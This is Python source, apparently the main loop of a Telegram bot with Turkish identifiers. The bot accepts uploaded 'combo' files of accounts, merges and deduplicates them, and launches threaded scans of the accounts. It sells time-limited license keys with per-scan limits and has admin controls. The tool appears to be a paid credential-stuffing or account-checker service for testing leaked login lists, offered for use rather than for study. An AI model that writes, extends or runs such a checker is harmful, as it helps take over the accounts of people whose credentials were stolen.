                            multi_bekleyen[chat_id] = []
                        elif data_cb == "key_giris":
                            send_message(chat_id, "🔑 To enter key: /key LICENSE_KEY")
                        elif data_cb == "key_olustur":
                            if str(chat_id) == str(ADMIN_ID):
                                key_menu(chat_id)
                        elif data_cb == "key_daily":
                            if str(chat_id) == str(ADMIN_ID):
                                key = generate_key("daily")
                                send_message(chat_id, f"✅ DAILY KEY CREATED\n\nKey: {key}\nPrice: 750 TCoin\nSingle Scan: 3.000\nDuration: 24 hours\n\nTimer starts when used.")
                        elif data_cb == "key_weekly":
                            if str(chat_id) == str(ADMIN_ID):
                                key = generate_key("weekly")
                                send_message(chat_id, f"✅ WEEKLY KEY CREATED\n\nKey: {key}\nPrice: 3.000 TCoin\nSingle Scan: 5.000\nDuration: 7 days\n\nTimer starts when used.")
                        elif data_cb == "key_monthly":
                            if str(chat_id) == str(ADMIN_ID):
                                key = generate_key("monthly")
                                send_message(chat_id, f"✅ MONTHLY KEY CREATED\n\nKey: {key}\nPrice: 9.000 TCoin\nSingle Scan: 7.000\nDuration: 30 days\n\nTimer starts when used.")
                        elif data_cb == "thread_menu":
                            if str(chat_id) == str(ADMIN_ID):
                                thread_menu(chat_id)
                        elif data_cb.startswith("thread_"):
                            if str(chat_id) == str(ADMIN_ID):
                                ADMIN_THREAD = int(data_cb.split("_")[1])
                                send_message(chat_id, f"✅ Thread set to {ADMIN_THREAD}.")
                                ana_menu(chat_id)
                        continue
                    if "message" not in update:
                        continue
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    if "document" in msg:
                        if bakim_modu and str(chat_id) != str(ADMIN_ID):
                            send_message(chat_id, "🔧 Bot is in maintenance mode. Please try later.")
                            continue
                        file_id = msg["document"]["file_id"]
                        file_name = msg["document"].get("file_name", "combo.txt")
                        if chat_id in multi_bekleyen:
                            multi_bekleyen[chat_id].append((file_id, file_name))
                            send_message(chat_id, f"📂 {file_name} added. Total: {len(multi_bekleyen[chat_id])} files. Type /bitti when done.")
                        else:
                            send_message(chat_id, "📂 File received, downloading...")
                            content = download_file(file_id)
                            if content is None:
                                send_message(chat_id, "❌ File could not be downloaded.")
                                continue
                            with open("uploaded_combo.txt", "w", encoding="utf-8") as f:
                                f.write(content)
                            accounts = cokludosyayukle(["uploaded_combo.txt"])
                            if not accounts:
                                send_message(chat_id, "❌ No valid accounts found.")
                                continue
                            plan_name = get_user_plan(chat_id)
                            plan_info = get_plan_info(plan_name)
                            single_limit = plan_info["single_limit"]
                            
                            if single_limit > 0 and len(accounts) > single_limit:
                                bekleyen_hesaplar[chat_id] = {
                                    "accounts": accounts[single_limit:],
                                    "file_name": file_name
                                }
                                send_message(chat_id, f"📂 File: {len(accounts)} accounts\n📂 Single Scan: {single_limit}\n\n⚠️ First {single_limit} accounts will be scanned.\nRemaining: {len(accounts) - single_limit}\nType /devam to continue.")
                                accounts = accounts[:single_limit]
                            
                            if plan_name == "free":
                                remaining = get_remaining_daily(chat_id)
                                if remaining <= 0:
                                    send_message(chat_id, "❌ DAILY LIMIT REACHED\n\n⏳ Reset at: 00:00")
                                    continue
                                if len(accounts) > remaining:
                                    bekleyen_hesaplar[chat_id] = {
                                        "accounts": accounts[remaining:],
                                        "file_name": file_name
                                    }
                                    send_message(chat_id, f"⚠️ First {remaining} accounts will be scanned.\nRemaining: {len(accounts) - remaining}")
                                    accounts = accounts[:remaining]
                            
                            send_message(chat_id, f"🔱 {len(accounts)} accounts found. Scanning started...")
                            
                            user_id = str(chat_id)
                            if user_id in users_db:
                                users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(accounts)
                                save_db()
                            
                            t = threading.Thread(target=tarama_yap, args=(chat_id, accounts, file_name), daemon=True)
                            t.start()
                    elif msg.get("text") == "/start":
                        ana_menu(chat_id)
                    elif msg.get("text") == "/stop":
                        tarama_durdur[chat_id] = True
                        send_message(chat_id, "⏹️ Stopping scan... Results will be sent shortly.")
                    elif msg.get("text") == "/devam":
                        if chat_id in bekleyen_hesaplar and bekleyen_hesaplar[chat_id].get("accounts"):
                            kalan = bekleyen_hesaplar[chat_id]["accounts"]
                            file_name = bekleyen_hesaplar[chat_id]["file_name"]
                            del bekleyen_hesaplar[chat_id]
                            
                            plan_name = get_user_plan(chat_id)
                            plan_info = get_plan_info(plan_name)
                            single_limit = plan_info["single_limit"]
                            
                            if single_limit > 0 and len(kalan) > single_limit:
                                bekleyen_hesaplar[chat_id] = {
                                    "accounts": kalan[single_limit:],
                                    "file_name": file_name
                                }
                                send_message(chat_id, f"⚠️ First {single_limit} accounts will be scanned.\nRemaining: {len(kalan) - single_limit}")
                                kalan = kalan[:single_limit]
                            
                            if plan_name == "free":
                                remaining = get_remaining_daily(chat_id)
                                if remaining <= 0:
                                    send_message(chat_id, "❌ DAILY LIMIT REACHED")
                                    continue
                                if len(kalan) > remaining:
                                    bekleyen_hesaplar[chat_id] = {
                                        "accounts": kalan[remaining:],
                                        "file_name": file_name
                                    }
                                    kalan = kalan[:remaining]
                            
                            send_message(chat_id, f"🔱 Continuing with {len(kalan)} accounts...")
                            
                            user_id = str(chat_id)
                            if user_id in users_db:
                                users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(kalan)
                                save_db()
                            
                            t = threading.Thread(target=tarama_yap, args=(chat_id, kalan, file_name), daemon=True)
                            t.start()
                        else:
                            send_message(chat_id, "❌ No remaining accounts to scan.")
                    elif msg.get("text") == "/durum":
                        durum_menu(chat_id)
                    elif msg.get("text") == "/rapor":
                        rapor(chat_id)
                    elif msg.get("text") == "/keyler":
                        keyler_listesi(chat_id)
                    elif msg.get("text") == "/bakim":
                        bakim(chat_id)
                    elif msg.get("text") == "/thread":
                        thread_menu(chat_id)
                    elif msg.get("text", "").startswith("/key "):
                        if bakim_modu and str(chat_id) != str(ADMIN_ID):
                            send_message(chat_id, "🔧 Bot is in maintenance mode.")
                            continue
                        key = msg["text"].split(" ", 1)[1].strip() if " " in msg["text"] else ""
                        if key in keys_db:
                            key_data = keys_db[key]
                            
                            if key_data.get("expires"):
                                expiry = datetime.fromisoformat(key_data["expires"])
                                if expiry <= datetime.now():
                                    send_message(chat_id, "❌ This key has expired.")
                                    continue
                            
                            if key_data.get("bound_to") and str(key_data["bound_to"]) != str(chat_id):
                                send_message(chat_id, "❌ This key is already bound to another account.")
                                continue
                            
                            keys_db[key]["bound_to"] = str(chat_id)
                            
                            # Süre kullanılınca başlar
                            if not key_data.get("expires"):
                                duration_hours = PLANS[key_data["type"]]["duration"]
                                if duration_hours:
                                    expiry = datetime.now() + timedelta(hours=duration_hours)
                                    keys_db[key]["expires"] = expiry.isoformat()
                            
                            user_id = str(chat_id)
                            if user_id not in users_db:
                                users_db[user_id] = {}
                            
                            users_db[user_id]["plan"] = key_data["type"]
                            users_db[user_id]["key_expires"] = keys_db[key]["expires"]
                            users_db[user_id]["daily_used"] = 0
                            users_db[user_id]["last_reset"] = datetime.now().strftime('%Y-%m-%d')
                            save_db()
                            
                            plan_info = get_plan_info(key_data["type"])
                            if keys_db[key].get("expires"):
                                expiry = datetime.fromisoformat(keys_db[key]["expires"])
                                remaining = expiry - datetime.now()
                                days = remaining.days
                                hours = remaining.seconds // 3600
                                kalan = f"{days}d {hours}h"
                            else:
                                kalan = "Unlimited"
                            
                            send_message(chat_id, f"✅ KEY ACTIVATED\n\n📋 Plan: {plan_info['name']}\n⏳ Remaining: {kalan}\n📂 Single: {plan_info['single_limit']}")
                        else:
                            send_message(chat_id, "❌ Invalid key.")
                    elif msg.get("text", "").startswith("/duyuru"):
                        if str(chat_id) == str(ADMIN_ID):
                            mesaj = msg["text"].replace("/duyuru", "").strip()
                            if mesaj:
                                duyuru(chat_id, mesaj)
                            else:
                                send_message(chat_id, "❌ Usage: /duyuru MESSAGE")
                    elif msg.get("text") == "/bitti":
                        if chat_id in multi_bekleyen and multi_bekleyen[chat_id]:
                            send_message(chat_id, "📂 Downloading and merging all files...")
                            tum_hesaplar = []
                            for fid, fname in multi_bekleyen[chat_id]:
                                content = download_file(fid)
                                if content:
                                    with open(f"multi_{fid}.txt", "w", encoding="utf-8") as f:
                                        f.write(content)
                                    hesaplar = cokludosyayukle([f"multi_{fid}.txt"])
                                    tum_hesaplar.extend(hesaplar)
                            benzersiz = list(dict.fromkeys(tum_hesaplar))
                            plan_name = get_user_plan(chat_id)
                            plan_info = get_plan_info(plan_name)
                            single_limit = plan_info["single_limit"]
                            
                            if single_limit > 0 and len(benzersiz) > single_limit:
                                bekleyen_hesaplar[chat_id] = {
                                    "accounts": benzersiz[single_limit:],
                                    "file_name": "multi_combo"
                                }
                                send_message(chat_id, f"⚠️ First {single_limit} accounts will be scanned.\nRemaining: {len(benzersiz) - single_limit}")
                                benzersiz = benzersiz[:single_limit]
                            
                            if plan_name == "free":
                                remaining = get_remaining_daily(chat_id)
                                if remaining <= 0:
                                    send_message(chat_id, "❌ Daily limit reached.")
                                    continue
                                if len(benzersiz) > remaining:
                                    bekleyen_hesaplar[chat_id] = {
                                        "accounts": benzersiz[remaining:],
                                        "file_name": "multi_combo"
                                    }
                                    benzersiz = benzersiz[:remaining]
                            
                            send_message(chat_id, f"🔱 Total {len(benzersiz)} accounts. Scanning started...")
                            
                            user_id = str(chat_id)
                            if user_id in users_db:
                                users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(benzersiz)
                                save_db()
                            
                            t = threading.Thread(target=tarama_yap, args=(chat_id, benzersiz, "multi_combo"), daemon=True)
                            t.start()
                            del multi_bekleyen[chat_id]
                        else:
                            send_message(chat_id, "❌ Start Multi Scan first.")
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    print("Bot started...")
    telegram_bot()
